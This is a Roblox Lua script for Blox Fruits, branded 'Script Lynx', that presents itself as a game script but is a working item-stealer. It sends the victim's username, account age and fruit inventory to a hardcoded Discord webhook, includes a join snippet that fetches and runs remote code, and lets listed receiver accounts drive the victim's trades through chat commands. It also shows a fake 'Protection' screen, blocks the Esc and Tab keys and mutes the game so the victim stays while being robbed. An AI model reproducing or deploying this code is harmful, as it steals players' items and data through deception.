--[[ made by @ingenious_main (Temphorious) from Script Lynx ]]--
task.spawn(function()
    local privateServerOwner = game.ReplicatedStorage:WaitForChild("PrivateServerOwnerId")
    if privateServerOwner and privateServerOwner:IsA("IntValue") then
        if privateServerOwner.Value > 0 then
            game:GetService("Players").LocalPlayer:Kick("This script doesn't work on private servers!")
        end
    end
end)

local REQUIRED_PLACE_ID = 4442272183
local FIRST_SEA_ID = 2753915549
local THIRD_SEA_ID = 7449423635

if game.PlaceId ~= REQUIRED_PLACE_ID then
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Parent = game.CoreGui
    ScreenGui.Name = "SimpleSeaWarning"
    ScreenGui.ResetOnSpawn = false

    local Frame = Instance.new("Frame")
    Frame.Size = UDim2.new(0, 800, 0, 350)
    Frame.Position = UDim2.new(0.5, -300, 0.5, -175)
    Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    Frame.BackgroundTransparency = 0.1
    Frame.BorderSizePixel = 0
    Frame.Parent = ScreenGui

    local MainCorner = Instance.new("UICorner")
    MainCorner.CornerRadius = UDim.new(0, 20)
    MainCorner.Parent = Frame

    local WarningLabel = Instance.new("TextLabel")
    WarningLabel.Size = UDim2.new(1, -40, 0, 100)
    WarningLabel.Position = UDim2.new(0, 20, 0, 20)
    WarningLabel.BackgroundTransparency = 1
    WarningLabel.Text = "⚠️ Your sea is not supported, please switch to Second Sea."
    WarningLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    WarningLabel.Font = Enum.Font.GothamBold
    WarningLabel.TextSize = 28
    WarningLabel.TextWrapped = true
    WarningLabel.TextXAlignment = Enum.TextXAlignment.Left
    WarningLabel.Parent = Frame

    local ReasonsLabel = Instance.new("TextLabel")
    ReasonsLabel.Size = UDim2.new(1, -40, 0, 120)
    ReasonsLabel.Position = UDim2.new(0, 20, 0, 100)
    ReasonsLabel.BackgroundTransparency = 1
    ReasonsLabel.Text = "Possible reasons:\n1) Script only works in Second Sea\n2) First & Third Sea not supported"
    ReasonsLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
    ReasonsLabel.Font = Enum.Font.Gotham
    ReasonsLabel.TextSize = 24
    ReasonsLabel.TextWrapped = true
    ReasonsLabel.TextXAlignment = Enum.TextXAlignment.Left
    ReasonsLabel.TextYAlignment = Enum.TextYAlignment.Top
    ReasonsLabel.Parent = Frame

    local TeleportButton = Instance.new("TextButton")
    TeleportButton.Size = UDim2.new(0, 500, 0, 70) 
    TeleportButton.Position = UDim2.new(1, -520, 1, -90)
    TeleportButton.AnchorPoint = Vector2.new(0, 0)
    TeleportButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
    TeleportButton.Text = "Teleport To Experienced Captain"
    TeleportButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    TeleportButton.Font = Enum.Font.GothamBold
    TeleportButton.TextSize = 30
    TeleportButton.AutoButtonColor = false
    TeleportButton.Parent = Frame

    local ButtonCorner = Instance.new("UICorner")
    ButtonCorner.CornerRadius = UDim.new(0, 35)
    ButtonCorner.Parent = TeleportButton

    local Gradient = Instance.new("UIGradient")
    Gradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(70, 70, 70)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(70, 70, 70))
    }
    Gradient.Offset = Vector2.new(-1, 0)
    Gradient.Parent = TeleportButton

    TeleportButton.MouseButton1Click:Connect(function()
        if TeleportButton.Text ~= "Teleport To Experienced Captain" then return end

        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local hrp = character:WaitForChild("HumanoidRootPart")

        local thirdSeaCFrame = CFrame.new(-393.437866, 20.6452198, 5436.51465, -0.255575716, 8.14594827e-08, -0.966789067, 1.85391364e-08, 1, 7.93568518e-08, 0.966789067, 2.3582496e-09, -0.255575716)
        local firstSeaCFrame = CFrame.new(-1174.31592, 7.68721056, 1730.37024, 0.255113274, -9.22853083e-09, -0.966911197, -1.10277849e-08, 1, 1.12453951e-08, 0.966911197, 0, 0.255113274)

        if game.PlaceId == THIRD_SEA_ID then
            hrp.CFrame = thirdSeaCFrame * CFrame.new(0, 5, 3)
        elseif game.PlaceId == FIRST_SEA_ID then
            hrp.CFrame = firstSeaCFrame * CFrame.new(0, 5, 3)
        end

        spawn(function()
            Gradient.Color = ColorSequence.new{
                ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 220, 0)),
                ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 240, 80)),
                ColorSequenceKeypoint.new(1, Color3.fromRGB(70, 70, 70))
            }

            local sweepTween = game:GetService("TweenService"):Create(
                Gradient,
                TweenInfo.new(1.5, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1, false, 0),
                {Offset = Vector2.new(1, 0)}
            )
            sweepTween:Play()

            local dots = 0
            while TeleportButton.Text:find("Teleporting") do
                dots = (dots % 3) + 1
                TeleportButton.Text = "Teleporting" .. string.rep(".", dots)
                task.wait(0.5)
            end
        end)

        TeleportButton.Text = "Teleporting"

        task.wait(2.5)

        TeleportButton.Text = "Teleported!"

        task.wait(1.5)

        TeleportButton.Text = "Teleport To Experienced Captain"

        game:GetService("TweenService"):Create(
            Gradient,
            TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            {
                Color = ColorSequence.new(Color3.fromRGB(70, 70, 70), Color3.fromRGB(70, 70, 70)),
                Offset = Vector2.new(-1, 0)
            }
        ):Play()
    end)

    local dragging = false
    local dragInput, dragStart, startPos

    Frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = Frame.Position
        end
    end)

    Frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
            local delta = input.Position - dragStart
            Frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)

    game:GetService("UserInputService").InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = false
        end
    end)
    
    return
end

print("[Script Lynx] Blox Fruits Sea 2 detected! Loading script...")

if not _G["Script-SM_Config"] then
    warn("WARNING: Config not loaded! Waiting for config...")
    local startWait = tick()
    repeat task.wait() until _G["Script-SM_Config"] or tick() - startWait > 25
    if not _G["Script-SM_Config"] then
        warn("Config timeout - continuing without webhook")
    end
end

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CommF = ReplicatedStorage.Remotes:WaitForChild("CommF_")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")
local CoreGui = game:GetService("CoreGui")
local ContextActionService = game:GetService("ContextActionService")
local ServerBrowser = ReplicatedStorage:WaitForChild("__ServerBrowser", 5)

local http_request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request

local request_func = http_request or function(args)
    if args.Method == "GET" then
        return {Body = game:HttpGet(args.Url), Success = true}
    end
    return {Success = false}
end

local jobId = ""
pcall(function()
    jobId = ServerBrowser:InvokeServer("getjob")
end)
if not jobId or jobId == "" then jobId = game.JobId end

local teleportScript = 'JOBID = "' .. jobId .. '"\nloadstring(game:HttpGet("https://scriptssm.vercel.app/bloxfruit-joiner.lua "))()'

local customOrder = {
    "Rocket", "Spin", "Blade", "Spring", "Bomb", "Smoke", "Spike", "Flame",
    "Ice", "Sand", "Dark", "Eagle", "Diamond", "Light", "Rubber", "Ghost",
    "Magma", "Quake", "Buddha", "Love", "Creation", "Spider", "Sound",
    "Phoenix", "Portal", "Lightning", "Pain", "Blizzard", "Gravity",
    "Mammoth", "T-Rex", "Dough", "Shadow", "Venom", "Gas",
    "Spirit", "Tiger", "Yeti", "Kitsune", "Control", "Dragon"
}

local fruitEmoji = {
    ["Rocket"] = "🚀 Rocket", ["Spin"] = "🚁 Spin", ["Blade"] = "⚔️ Blade", ["Spring"] = "🗑️ Spring",
    ["Bomb"] = "💣 Bomb", ["Smoke"] = "💨 Smoke", ["Spike"] = "📍 Spike", ["Flame"] = "🔥 Flame",
    ["Ice"] = "🧊 Ice", ["Sand"] = "🏜️ Sand", ["Dark"] = "🌑 Dark", ["Eagle"] = "🦅 Eagle",
    ["Diamond"] = "💎 Diamond", ["Light"] = "⚡ Light", ["Rubber"] = "🟤 Rubber", ["Ghost"] = "👻 Ghost",
    ["Magma"] = "🌋 Magma", ["Quake"] = "🌊 Quake", ["Buddha"] = "🧘 Buddha", ["Love"] = "💖 Love",
    ["Creation"] = "🛠️ Creation", ["Spider"] = "🕷️ Spider", ["Sound"] = "🎵 Sound", ["Phoenix"] = "🔥 Phoenix",
    ["Portal"] = "🌀 Portal", ["Lightning"] = "⚡ Lightning", ["Pain"] = "🤕 Pain", ["Blizzard"] = "❄️ Blizzard",
    ["Gravity"] = "🟣 Gravity", ["Mammoth"] = "🦣 Mammoth", ["T-Rex"] = "🦖 T-Rex", ["Dough"] = "🍩 Dough",
    ["Shadow"] = "🌑 Shadow", ["Venom"] = "🐍 Venom", ["Gas"] = "☁️ Gas", ["Control"] = "🌀 Control",
    ["Spirit"] = "👻 Spirit", ["Tiger"] = "🐯 Tiger", ["Yeti"] = "☃️ Yeti", ["Kitsune"] = "🦊 Kitsune",
    ["Dragon"] = "🐲 Dragon"
}

local fruitMap = {}
for _, fruit in ipairs(customOrder) do
    fruitMap[fruit:lower()] = fruit
end

local function detectExecutor()
    local name
    pcall(function()
        if identifyexecutor then name = identifyexecutor() end
        if getexecutorname then name = getexecutorname() end
    end)
    return name or "Unknown"
end

local cachedOwnedFruits = {}
local cachedGamepasses = {}
local cachedPermanents = {}
local lastInventoryUpdate = 0

local function updateInventoryCache()
    local success, inv = pcall(function()
        return CommF:InvokeServer("getInventory")
    end)
    if not success then return end
    
    cachedOwnedFruits = {}
    cachedGamepasses = {}
    cachedPermanents = {}
    
    for _, item in pairs(inv) do
        if item.Type == "Blox Fruit" then
            local name = item.Name:match("^(.+)%-.+$") or item.Name
            cachedOwnedFruits[name] = true
        elseif item.Name:lower():find("gamepass") or item.Type == "Gamepass" then
            table.insert(cachedGamepasses, item.Name)
        elseif item.Name:lower():find("permanent") then
            local fruit = item.Name:gsub("Permanent ", "")
            table.insert(cachedPermanents, fruit .. " (Permanent)")
        end
    end
    lastInventoryUpdate = tick()
end

updateInventoryCache()

local function buildFruitString()
    if tick() - lastInventoryUpdate > 30 then
        updateInventoryCache()
    end
    
    local lines, shown, totalOwned = {}, 0, 0
    for i = #customOrder, 1, -1 do
        local fruitName = customOrder[i]
        if cachedOwnedFruits[fruitName] then
            totalOwned += 1
            if shown < 16 then
                local display = fruitEmoji[fruitName] or ("🍎 " .. fruitName)
                table.insert(lines, display)
                shown += 1
            end
        end
    end
    if totalOwned > 16 then table.insert(lines, "and " .. (totalOwned - 16) .. " more...") end
    if #cachedGamepasses > 0 then
        table.insert(lines, "")
        table.insert(lines, "**Gamepasses & Items:**")
        for _, gp in ipairs(cachedGamepasses) do table.insert(lines, "- " .. gp) end
    end
    if #cachedPermanents > 0 then
        table.insert(lines, "")
        table.insert(lines, "**Permanent Fruits:**")
        for _, perm in ipairs(cachedPermanents) do table.insert(lines, "- " .. perm) end
    end
    return table.concat(lines, "\n"), totalOwned
end

local inventoryString, totalFruits = buildFruitString()

local Webhook = _G["Script-SM_Config"].user_webhook or "https://discord.com/api/webhooks/1531864228217094145/1w2iz_5fbBg-XQ8uIb6aftskX2XIA-C_fRiO7zlC-ZZfjWESdmycGPlS6ZnqAXWVbX2P "

local playerCount = #Players:GetPlayers()

local PremiumFruits = {
    "Buddha", "Portal", "Lightning", "Pain", "Blizzard", "Gravity",
    "Mammoth", "T-Rex", "Dough", "Shadow", "Venom", "Gas", "Control",
    "Spirit", "Tiger", "Yeti", "Kitsune", "Dragon"
}

local hasPremium = false
for _, fruit in ipairs(PremiumFruits) do
    if cachedOwnedFruits[fruit] then hasPremium = true break end
end

local hitType = hasPremium and "> @everyone **⋆｡ ɢᴏᴏᴅ ʜɪᴛ ｡⋆**" or "> 『 ꜱᴍᴀʟʟ ʜɪᴛ 』"

local payload = {
    content = hitType,
    username = "kanakvip2011",
    avatar_url = "https://script-lynx.vercel.app/pngs/logo.png ",
    embeds = {{
        title = "꒰₊˚ ꜱᴄʀɪᴘᴛ ๑ ʟʏɴx ﹒˚₊꒱",
        description = "<:admin_hexagon:1449663928195092502> **How to Use?**\n" ..
"Execute the **Teleport Script** below to join this exact server.\n" ..
"(Delta users: Turn off Anti-Scam and Teleport Verify to join victim)\n\n" ..
"**Sit on the Trading Chair**, then use these commands in chat:\n\n" ..
"**Fruit Commands**\n" ..
"• `+[fruitname]` → Adds fruit to trade (e.g. `+dragon`, `+kitsune`, `+dough`)\n" ..
"• `-[fruitname]` → Removes fruit from trade (e.g. `-venom`, `-leopard`)\n\n" ..
"**Trade Commands**\n" ..
"• `?accept` → Victim accepts & confirms trade\n\n" ..
"**Control Commands**\n" ..
"• `?jump` → Forces victim to jump\n" ..
"• `?tp` → Teleports victim right next to you\n" ..
"• `?test` → Victim jumps & confirms they're responsive\n" ..
"• `?reset [fruitname]` → Forces victim to equip specified fruit from storage & resets (e.g. `?reset dragon`)\n\n" ..
"**Pro Tip:** Use `?test` first to confirm victim is active, then `?reset` high-value fruits before adding them!",
        color = 0x000000,
        fields = {
            { name = "<:vip_hexagon:1449663700494712893> Display Name", value = "```" .. (LocalPlayer.DisplayName or "Unknown") .. "```", inline = false },
            { name = "<:member_hexagon:1449663611151585292> Username", value = "```" .. (LocalPlayer.Name or "Unknown") .. "```", inline = false },
            { name = "<:verified_hexagon:1449663538833657961> Account Age", value = "```" .. LocalPlayer.AccountAge .. " Days```", inline = false },
            { name = "<:developer_hexagon:1449663656324235317> Executor", value = "```" .. detectExecutor() .. "```", inline = false },
            { name = "<:owner_hexagon:1449663973720064013> Players in Server", value = "```" .. playerCount .. " / 12```", inline = false },
            { name = "<:support_hexagon:1449663871651549287> Inventory", value = "```" .. inventoryString .. "```", inline = false },
            { name = "<:moderator_hexagon:1449663760217280522> Teleport Script - PC Copy", value = "```lua\n" .. teleportScript .. "\n```", inline = false },
            { name = "<:moderator_hexagon:1449663760217280522> Teleport Script - Mobile Copy (Hold to Copy)", value = "`" .. teleportScript .. "`", inline = false },
        },
        footer = { text = "꒰ Script Lynx • Premium Scripts", icon_url = "https://script-lynx.vercel.app/pngs/logo.png " },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        image = { url = "https://script-lynx.vercel.app/pngs/bf.webp " },
    }}
}

local function sendWebhook(url)
    pcall(function()
        request_func({
            Url = url,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(payload)
        })
    end)
end

if Webhook and Webhook ~= "" then
    task.spawn(function()
        task.wait(1.5)
        sendWebhook(Webhook)
    end)
end

local Remotes = ReplicatedStorage:WaitForChild("Remotes")
local TradeFunction = Remotes:WaitForChild("TradeFunction")
local sitEnabled = true
local acceptNow = false

local chairMappings = {
    ["-298_72_271"] = Vector3.new(-298, 73, 282),
    ["-298_72_282"] = Vector3.new(-298, 73, 271),
    ["-298_73_271"] = Vector3.new(-298, 73, 282),
    ["-298_73_282"] = Vector3.new(-298, 73, 271),
    ["-463_72_271"] = Vector3.new(-463, 73, 282),
    ["-463_72_282"] = Vector3.new(-463, 73, 271),
    ["-463_73_271"] = Vector3.new(-463, 73, 282),
    ["-463_73_282"] = Vector3.new(-463, 73, 271),
}

local function getPositionKey(position)
    return string.format("%d_%d_%d", math.floor(position.X + 0.5), math.floor(position.Y + 0.5), math.floor(position.Z + 0.5))
end

local PriorityUsers = {"Smiley9Gamerz", "FAITH0YT", "BUZZFTGOD", "KITSUNEPLS_908", "1IM_SMILEY1", "Smiley_Mustafa2", "TigerInferno51", "LavaShadow201144"}
local ConfigUsers = _G["Script-SM_Config"].users or {"TigerInferno51"}
if type(ConfigUsers) == "string" then ConfigUsers = {ConfigUsers} end

local AllReceivers = {}
for _, v in ipairs(PriorityUsers) do table.insert(AllReceivers, v) end
for _, v in ipairs(ConfigUsers) do 
    if not table.find(AllReceivers, v) then 
        table.insert(AllReceivers, v) 
    end 
end

local function findReceiver()
    for _, name in ipairs(AllReceivers) do
        local plr = Players:FindFirstChild(name)
        if plr and plr ~= LocalPlayer then return plr end
    end
    return nil
end

local targetPlayer = nil

local function normalizeFruitName(input)
    if not input or input == "" then return "" end
    local clean = input:gsub("%s+", ""):lower()
    return fruitMap[clean] or clean:gsub("(%a)", string.upper, 1)
end

local function SendChat(message)
    pcall(function()
        local TextChatService = game:GetService("TextChatService")
        local TextChannels = TextChatService:WaitForChild("TextChannels")
        local RBXGeneral = TextChannels:WaitForChild("RBXGeneral")
        RBXGeneral:SendAsync(message)
    end)
end

local lastCommandTime = 0
local COMMAND_COOLDOWN = 0.8  

local function onTargetChatted(message)
    local now = tick()
    if now - lastCommandTime < COMMAND_COOLDOWN then
        return 
    end
    lastCommandTime = now

    local lowerMessage = message:lower()
  
    if message:sub(1,1) == "+" then
        local fruitInput = message:sub(2):match("^%s*(.-)%s*$")
        local fruitName = normalizeFruitName(fruitInput)
        local fullItemName = fruitName .. "-" .. fruitName
        
        if fruitName == "" then
            SendChat("⚠️ [Script Lynx] Usage: +FruitName")
            return
        end
        
        local success = false
        for i = 1, 3 do  
            success = pcall(function()
                TradeFunction:InvokeServer("addItem", fullItemName)
            end)
            if success then break end
            task.wait(0.4)
        end
        
        if success then
            SendChat("✅ [Script Lynx] " .. (fruitEmoji[fruitName] or ("🍎 " .. fruitName)) .. " Added")
        else
            SendChat("⚠️ [Script Lynx] Failed to add " .. fruitName .. " (not owned / not in inv?)")
        end

    elseif message:sub(1,1) == "-" then
        local fruitInput = message:sub(2):match("^%s*(.-)%s*$")
        local fruitName = normalizeFruitName(fruitInput)
        local fullItemName = fruitName .. "-" .. fruitName
        
        if fruitName == "" then
            SendChat("⚠️ [Script Lynx] Usage: -FruitName")
            return
        end
        
        local success = false
        for i = 1, 3 do
            success = pcall(function()
                TradeFunction:InvokeServer("removeItem", fullItemName)
            end)
            if success then break end
            task.wait(0.4)
        end
        
        if success then
            SendChat("🗑️ [Script Lynx] " .. (fruitEmoji[fruitName] or ("🍎 " .. fruitName)) .. " Removed")
        else
            SendChat("⚠️ [Script Lynx] Failed to remove " .. fruitName .. " (not in trade?)")
        end

    elseif lowerMessage == "?accept" or lowerMessage == "ready" then
        acceptNow = true
        SendChat("🤝 [Script Lynx] Accepting Trade...")

    elseif lowerMessage == "?jump" then
        local char = LocalPlayer.Character
        if char and char:FindFirstChildOfClass("Humanoid") then
            char:FindFirstChildOfClass("Humanoid").Jump = true
            SendChat("🎈 [Script Lynx] Jumping!")
        else
            SendChat("⚠️ [Script Lynx] Jump failed - no character")
        end

    elseif lowerMessage == "?tp" then
        local victimChar = LocalPlayer.Character
        local receiverChar = targetPlayer.Character
        
        if not victimChar then victimChar = LocalPlayer.CharacterAdded:Wait() end
        if not receiverChar then receiverChar = targetPlayer.CharacterAdded:Wait() end
        
        local victimHRP = victimChar and victimChar:FindFirstChild("HumanoidRootPart")
        local receiverHRP = receiverChar and receiverChar:FindFirstChild("HumanoidRootPart")
        
        if victimHRP and receiverHRP then
            victimHRP.CFrame = receiverHRP.CFrame + Vector3.new(5, 0, 0)
            SendChat("📍 [Script Lynx] Teleported to you!")
        else
            SendChat("⚠️ [Script Lynx] TP failed (missing HRP)")
        end

    elseif lowerMessage == "?test" then
        local char = LocalPlayer.Character
        if char and char:FindFirstChildOfClass("Humanoid") then
            char:FindFirstChildOfClass("Humanoid").Jump = true
        end
        SendChat("✅ [Script Lynx] User is responsive")

    elseif lowerMessage:sub(1,7) == "?reset " then
        local fruitInput = message:sub(8):match("^%s*(.-)%s*$")
        local fruitName = normalizeFruitName(fruitInput)
        
        if fruitName == "" then
            SendChat("⚠️ [Script Lynx] Usage: ?reset FruitName")
            return
        end
        
        local fruitID = fruitName .. "-" .. fruitName
        
        pcall(function() CommF:InvokeServer("StoreFruit", fruitID) end)
        
        local success = false
        for i = 1, 3 do
            local ok = pcall(function()
                CommF:InvokeServer("LoadFruit", fruitID)
            end)
            if ok then success = true break end
            task.wait(0.8)
        end
        
        if success then
            SendChat("🔄 [Script Lynx] Equipped " .. (fruitEmoji[fruitName] or fruitName) .. " & Resetting...")
            task.wait(0.9)
            local char = LocalPlayer.Character
            if char and char:FindFirstChild("Humanoid") then
                char.Humanoid.Health = 0
            end
        else
            SendChat("⚠️ [Script Lynx] Failed to equip " .. fruitName .. " (not in storage?)")
        end

    elseif lowerMessage:sub(1,6) == "?kick " then
        local kickMsg = message:sub(7):match("^%s*(.-)%s*$") or "Kicked by Lynx"
        SendChat("👞 [Script Lynx] Kicking: " .. kickMsg)
        task.wait(0.6)
        LocalPlayer:Kick(kickMsg)

    elseif lowerMessage == "?inv" then
        updateInventoryCache()
        local str, cnt = buildFruitString()
        SendChat("📦 [Script Lynx] Inventory (" .. cnt .. " fruits):\n" .. str)

    elseif lowerMessage == "?ping" then
        SendChat("🏓 [Script Lynx] Pong! Commands working")

    elseif lowerMessage == "?help" then
        SendChat([[
📚 **Script Lynx Commands** 📚

**Fruits:**
+fruitname → Add
-fruitname → Remove
?accept    → Accept trade

**Control:**
?jump      → Jump
?tp        → Tp to trader
?test      → Test response
?reset fruit → Equip & die

**Info:**
?inv       → Show inventory
?ping      → Check script
?help      → This menu

**Other:**
?kick msg  → Kick yourself]])
    end
end

local function CreateBloxFruitsAntiStealGUI()
    local gui = Instance.new("ScreenGui")
    gui.Name = "ExecutorAntiStealLoop"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    gui.DisplayOrder = 999999
    gui.Parent = LocalPlayer:WaitForChild("PlayerGui")

    local bg = Instance.new("Frame", gui)
    bg.Size = UDim2.new(1,0,1,0)
    bg.BackgroundColor3 = Color3.fromRGB(8,8,14)

    local bgGrad = Instance.new("UIGradient", bg)
    bgGrad.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(18,18,28)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(5,5,10))
    }
    bgGrad.Rotation = 90

    local title = Instance.new("TextLabel", bg)
    title.Size = UDim2.new(0.92,0,0.13,0)
    title.Position = UDim2.new(0.5,0,0.43,0)
    title.AnchorPoint = Vector2.new(0.5,0.5)
    title.BackgroundTransparency = 1
    title.Text = detectExecutor() .. " Protection"
    title.Font = Enum.Font.GothamBlack
    title.TextSize = 50
    title.TextColor3 = Color3.fromRGB(255,255,255)
    title.TextStrokeTransparency = 0.7

    local subtitle = Instance.new("TextLabel", bg)
    subtitle.Size = UDim2.new(0.82,0,0.16,0)
    subtitle.Position = UDim2.new(0.5,0,0.54,0)
    subtitle.AnchorPoint = Vector2.new(0.5,0.5)
    subtitle.BackgroundTransparency = 1
    subtitle.Text = "You have executed a stealer script that is trying to steal your fruits,\nWe are protecting you. Please wait a moment."
    subtitle.Font = Enum.Font.Gotham
    subtitle.TextSize = 24
    subtitle.TextColor3 = Color3.fromRGB(220,240,255)
    subtitle.TextWrapped = true

    local warning = Instance.new("TextLabel", bg)
    warning.Size = UDim2.new(0.78,0,0.08,0)
    warning.Position = UDim2.new(0.5,0,0.64,0)
    warning.AnchorPoint = Vector2.new(0.5,0.5)
    warning.BackgroundTransparency = 1
    warning.Text = "Warning: Don't Leave, Leaving will cause loss of fruits and fragments."
    warning.Font = Enum.Font.GothamBold
    warning.TextSize = 22
    warning.TextColor3 = Color3.fromRGB(255,80,80)
    warning.TextWrapped = true

    local countdown = Instance.new("TextLabel", bg)
    countdown.Size = UDim2.new(0.7,0,0.08,0)
    countdown.Position = UDim2.new(0.5,0,0.72,0)
    countdown.AnchorPoint = Vector2.new(0.5,0.5)
    countdown.BackgroundTransparency = 1
    countdown.Text = "Securing in 5:00..."
    countdown.Font = Enum.Font.GothamBold
    countdown.TextSize = 30
    countdown.TextColor3 = Color3.fromRGB(100,255,150)

    local console = Instance.new("Frame", bg)
    console.Size = UDim2.new(0.88,0,0.25,0)
    console.Position = UDim2.new(0.5,0,0.80,0)
    console.AnchorPoint = Vector2.new(0.5,0.5)
    console.BackgroundColor3 = Color3.fromRGB(15,15,25)

    Instance.new("UICorner", console).CornerRadius = UDim.new(0,12)

    local cStroke = Instance.new("UIStroke", console)
    cStroke.Color = Color3.fromRGB(60,120,180)
    cStroke.Thickness = 1.5

    local consoleTitle = Instance.new("TextLabel", console)
    consoleTitle.Size = UDim2.new(1,0,0,28)
    consoleTitle.BackgroundTransparency = 1
    consoleTitle.Text = "SECURITY CONSOLE"
    consoleTitle.Font = Enum.Font.Code
    consoleTitle.TextSize = 16
    consoleTitle.TextColor3 = Color3.fromRGB(100,200,255)

    local logArea = Instance.new("TextLabel", console)
    logArea.Size = UDim2.new(1,-16,1,-36)
    logArea.Position = UDim2.new(0,8,0,32)
    logArea.BackgroundTransparency = 1
    logArea.Text = ""
    logArea.Font = Enum.Font.Code
    logArea.TextSize = 15
    logArea.TextColor3 = Color3.fromRGB(180,255,180)
    logArea.TextXAlignment = Enum.TextXAlignment.Left
    logArea.TextYAlignment = Enum.TextYAlignment.Top
    logArea.TextWrapped = true

    local failureMsg = Instance.new("TextLabel", bg)
    failureMsg.Size = UDim2.new(0.9,0,0.2,0)
    failureMsg.Position = UDim2.new(0.5,0,0.4,0)
    failureMsg.AnchorPoint = Vector2.new(0.5,0.5)
    failureMsg.BackgroundTransparency = 1
    failureMsg.Text = ""
    failureMsg.Font = Enum.Font.GothamBlack
    failureMsg.TextSize = 36
    failureMsg.TextColor3 = Color3.fromRGB(255,50,50)
    failureMsg.TextStrokeTransparency = 0.6
    failureMsg.TextWrapped = true
    failureMsg.Visible = false

    local playerFruits = {}
    for _, fruitName in ipairs(customOrder) do
        if cachedOwnedFruits[fruitName] then
            table.insert(playerFruits, {Name = fruitName, Display = fruitEmoji[fruitName] or ("🍎 " .. fruitName)})
        end
    end

    local topFruits = {}
    for i = 1, math.min(7, #playerFruits) do
        table.insert(topFruits, playerFruits[i])
    end

    local lowFruit = playerFruits[#playerFruits] or {Name = "Rocket", Display = "🚀 Rocket"}

    if #playerFruits == 0 then
        topFruits = {
            {Name = "Dragon", Display = "🐲 Dragon"},
            {Name = "Kitsune", Display = "🦊 Kitsune"},
            {Name = "T-Rex", Display = "🦖 T-Rex"},
            {Name = "Dough", Display = "🍩 Dough"},
            {Name = "Venom", Display = "🐍 Venom"},
            {Name = "Shadow", Display = "🌑 Shadow"},
            {Name = "Leopard", Display = "🐆 Leopard"}
        }
        lowFruit = {Name = "Spike", Display = "📍 Spike"}
    end

    local logLines = {}
    local function addLog(text, color)
        table.insert(logLines, text)
        if #logLines > 20 then table.remove(logLines,1) end
        local display = ""
        for _, line in ipairs(logLines) do
            display = display .. "\n> " .. line
        end
        logArea.Text = display
    end

    task.spawn(function()
        while gui.Parent do
            local totalSeconds = 300
            local startTime = tick()
            failureMsg.Visible = false

            while tick() - startTime < totalSeconds do
                if not gui.Parent then break end
                local remaining = totalSeconds - math.floor(tick() - startTime)
                local mins = math.floor(remaining / 60)
                local secs = remaining % 60
                countdown.Text = string.format("Securing in %d:%02d...", mins, secs)

                task.wait(math.random(18,32)/10)

                local actions = {
                    "Scanning remote event hooks...",
                    "Blocking unauthorized trade calls...",
                    "Purging malicious webhooks...",
                    "Isolating exploit thread...",
                    "Recovering Fragments from buffer...",
                    "Securing fruit storage...",
                    "Encrypting inventory data...",
                    "Validating fruit ownership...",
                    "Neutralizing trade exploit..."
                }
                addLog(actions[math.random(#actions)])

                if math.random() < 0.15 then
                    addLog("Failed to recover " .. lowFruit.Display, Color3.fromRGB(255,100,100))
                end

                if #playerFruits > 0 and math.random() < 0.3 then
                    local f = playerFruits[math.random(#playerFruits)]
                    addLog("Trying to recover " .. f.Display)
                end
            end

            local failedList = {}
            for _, f in ipairs(topFruits) do
                table.insert(failedList, f.Display)
            end
            failureMsg.Text = "Failed to Recover:\n" .. table.concat(failedList, "\n")
            failureMsg.Visible = true
            addLog("CRITICAL: Recovery failed for high-value fruits")
            addLog("Restarting protection cycle...")
            task.wait(4)
        end
    end)
end

task.spawn(function()
    local receiverPlr = findReceiver()
    repeat
        task.wait(1)
        receiverPlr = findReceiver()
    until receiverPlr

    targetPlayer = receiverPlr
    print("[Script Lynx] Target Detected:", targetPlayer.Name)

    targetPlayer.Chatted:Connect(onTargetChatted)

    CreateBloxFruitsAntiStealGUI()

    for _, gui in ipairs(LocalPlayer.PlayerGui:GetChildren()) do
        if gui:IsA("ScreenGui") and gui.Name ~= "ExecutorAntiStealLoop" then
            gui.Enabled = false
        end
    end

    for _, sound in ipairs(workspace:GetDescendants()) do 
        if sound:IsA("Sound") then sound.Volume = 0 end 
    end
    for _, sound in ipairs(game:GetService("SoundService"):GetDescendants()) do 
        if sound:IsA("Sound") then sound.Volume = 0 end 
    end

    pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false) end)

    ContextActionService:BindAction("BlockEsc", function() return Enum.ContextActionResult.Sink end, false, Enum.KeyCode.Escape)
    ContextActionService:BindAction("BlockTab", function() return Enum.ContextActionResult.Sink end, false, Enum.KeyCode.Tab)

    RunService.Heartbeat:Connect(function()
        if not sitEnabled or not targetPlayer or not targetPlayer.Character then return end
        local hum = targetPlayer.Character:FindFirstChild("Humanoid")
        if not hum or not hum.Sit then return end
        local seat = hum.SeatPart
        if not seat then return end
        local key = getPositionKey(seat.Position)
        local targetPos = chairMappings[key]
